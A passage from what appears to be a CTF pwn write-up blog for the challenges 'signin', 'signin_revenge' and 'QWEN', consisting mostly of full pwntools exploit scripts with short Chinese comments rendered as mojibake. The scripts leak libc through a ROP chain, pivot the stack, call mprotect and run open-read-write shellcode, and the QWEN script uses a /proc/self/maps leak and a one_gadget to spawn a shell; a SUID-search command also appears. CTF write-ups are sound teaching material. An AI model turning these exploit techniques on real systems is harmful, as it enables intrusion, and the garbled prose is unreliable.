class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x404500</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string">mov rcx, 0x67616c662f2e;</span></span><br><span class="line"><span class="string">push rcx;</span></span><br><span class="line"><span class="string">mov rdi, rsp;</span></span><br><span class="line"><span class="string">xor rsi, rsi;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">mov rsi, 0x404600;</span></span><br><span class="line"><span class="string">mov rdx, 0x50;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">inc rax;</span></span><br><span class="line"><span class="string">mov rsi, 0x404600;</span></span><br><span class="line"><span class="string">mov rdx, 0x50;</span></span><br><span class="line"><span class="string">mov rdi, 1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">ls(libc_base)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = csu(edi=<span class="number">0x404000</span>, rsi=<span class="number">0x1000</span>, rdx=<span class="number">0x7</span>, r12=<span class="number">0x404510</span>, mode=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x404480</span>)</span><br><span class="line">payload += asm(shell)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&quot;x&quot;</span>)</span><br><span class="line">payload += p64(bss_addr - <span class="number">0x108</span>)</span><br><span class="line">payload += p64(lev_ret)</span><br><span class="line">payload += p64(mprotect_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç»™æˆäº†ä¸‹ä¸€ä¸ªé¢˜çš„é™„ä»¶ï¼Œåæ¥ç´§æ€¥æ¢ä¸Šçš„ã€‚<del>è‰å°ç­å­</del><br>é¦–å…ˆæœ‰ä¸ªçŒœéšæœºæ•°çš„å¯ä»¥è¦†å†™ç§å­ç»•è¿‡ï¼Œä¹‹åæœ‰ä¸€ä¸ªç±»ä¼¼å †çš„ä¸œè¥¿ï¼Œäº‹å®ä¸Šæ˜¯æ ˆæº¢å‡ºï¼Œå’Œå †ä¸€ç‚¹å…³ç³»éƒ½æ²¡æœ‰ã€‚æœ‰ä¸ªæ²™ç®±ï¼Œç›´æ¥æ ˆè¿ç§»â•mprotectç„¶åå†™å…¥shellcode,æ‰“orw.</p>
<hr>
<h1 id="signin-revenge"><a href="#signin-revenge" class="headerlink" title="signin_revenge"></a>signin_revenge</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwnlib.fmtstr <span class="keyword">import</span> make_atoms_simple</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./signin/vuln&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./signin/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_dll = cdll.LoadLibrary(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;pwn-f2237b44a0.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-16186d9a30.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __libc_start_main</span></span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x401370</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">edi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, r12=<span class="number">0</span>, start=csu_start, mode=<span class="number">0</span></span>):</span><br><span class="line">    end = start + <span class="number">0x1A</span></span><br><span class="line">    payload = p64(end)</span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">        payload += p64(r12)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(edi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rdx</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += p64(edi)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(r12)  <span class="comment"># rdx</span></span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload += <span class="string">b&quot;a&quot;</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sig</span>(<span class="params">rax=<span class="number">0</span>, rdi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, rsp=<span class="number">0</span>, rip=<span class="number">0</span></span>):</span><br><span class="line">    sigframe = SigreturnFrame()</span><br><span class="line">    sigframe.rax = rax</span><br><span class="line">    sigframe.rdi = rdi  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">    sigframe.rsi = rsi</span><br><span class="line">    sigframe.rdx = rdx</span><br><span class="line">    sigframe.rsp = rsp</span><br><span class="line">    sigframe.rip = rip</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(sigframe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">vuln_addr = elf.sym.vuln</span><br><span class="line">read_addr = <span class="number">0x000000004012CF</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401393</span></span><br><span class="line">lev_ret = <span class="number">0x00000000004012BE</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040101A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x108</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;pwn!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc_base = recv(<span class="string">b&quot;\n&quot;</span>) - libc.sym.puts</span><br><span class="line">mprotect_addr = libc_base + libc.sym.mprotect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x404500</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string">mov rcx, 0x67616c662f2e;</span></span><br><span class="line"><span class="string">push rcx;</span></span><br><span class="line"><span class="string">mov rdi, rsp;</span></span><br><span class="line"><span class="string">xor rsi, rsi;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">mov rsi, 0x404600;</span></span><br><span class="line"><span class="string">mov rdx, 0x50;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">inc rax;</span></span><br><span class="line"><span class="string">mov rsi, 0x404600;</span></span><br><span class="line"><span class="string">mov rdx, 0x50;</span></span><br><span class="line"><span class="string">mov rdi, 1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">ls(libc_base)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = csu(edi=<span class="number">0x404000</span>, rsi=<span class="number">0x1000</span>, rdx=<span class="number">0x7</span>, r12=<span class="number">0x404510</span>, mode=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x404480</span>)</span><br><span class="line">payload += asm(shell)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&quot;x&quot;</span>)</span><br><span class="line">payload += p64(bss_addr - <span class="number">0x108</span>)</span><br><span class="line">payload += p64(lev_ret)</span><br><span class="line">payload += p64(mprotect_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ‰ç‚¹æ— è¯­ï¼Œå°±æ˜¯æŠŠsigninä¸­çš„æ ˆæº¢å‡ºå‡½æ•°å•ç‹¬å¼„äº†å‡ºæ¥ï¼Œæ²™ç®±éƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚è™½ç„¶è¯»å…¥å†…å®¹å°‘äº†ï¼Œä½†è¿˜æ˜¯èƒ½å¤Ÿæ ˆè¿ç§»ã€‚å’Œä¸Šä¸€é¢˜åšæ³•ä¸€æ ·ã€‚</p>
<hr>
<h1 id="QWEN"><a href="#QWEN" class="headerlink" title="QWEN"></a>QWEN</h1><blockquote>
<p>æœ€å¯æƒœçš„ä¸€é›†ï¼Œæœ¬æ¥èƒ½æ‹¿ä¸€è¡€çš„ï¼Œä½†è¢«è¿œç¨‹æƒé™å¡äº†ä¸¤ä¸ªå°æ—¶ :(</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwnlib.fmtstr <span class="keyword">import</span> make_atoms_simple</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./QWEN/pwn1&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./QWEN/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-deb19cee97.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_from_libc</span>(<span class="params">func_name: <span class="built_in">str</span>, func_addr: <span class="built_in">int</span>, libc=libc</span>):</span><br><span class="line">    log.success(func_name + <span class="string">&quot;: &quot;</span> + <span class="built_in">hex</span>(func_addr))</span><br><span class="line">    offset = func_addr - libc.symbols[func_name]</span><br><span class="line">    binsh = offset + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">    system = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;offset: &quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">    <span class="keyword">return</span> (system, binsh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __libc_start_main</span></span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">edi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, r12=<span class="number">0</span>, start=csu_start, mode=<span class="number">0</span></span>):</span><br><span class="line">    end = start + <span class="number">0x1A</span></span><br><span class="line">    payload = p64(end)</span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">        payload += p64(r12)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(edi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rdx</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += p64(edi)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(r12)  <span class="comment"># rdx</span></span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload += <span class="string">b&quot;a&quot;</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;0 0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;1 1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;2 2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;3 3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;4 4&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span> + <span class="string">b&quot;\x08\x15&quot;</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;[Y/N]\n&quot;</span>, <span class="string">b&quot;N&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;999 999&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; key\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0x6B8B4567</span>).encode())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;in!\n&quot;</span>, <span class="string">b&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">p.recvlines(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">text_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;-&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.recvlines(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;-&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[vdso]\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;-&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;0 0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;1 1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;2 2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;3 3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;4 4&quot;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4F29E</span>, <span class="number">0x4F2A5</span>, <span class="number">0x4F302</span>, <span class="number">0x10A2FC</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span> + p64(one[<span class="number">3</span>] + libc_base) + p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;[Y/N]\n&quot;</span>, <span class="string">b&quot;N&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\xef\xbc\x9a&quot;</span>, <span class="string">b&quot;512 256&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">find / -user root -perm -4000-print2&gt;/dev/null</span></span><br><span class="line"><span class="string">0x4f29e execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rsp+0x50 is writable</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL || &#123;rcx, &quot;-c&quot;, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rsp+0x50 is writable</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL || &#123;rcx, rax, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL || &#123;[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...&#125; is a valid argv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

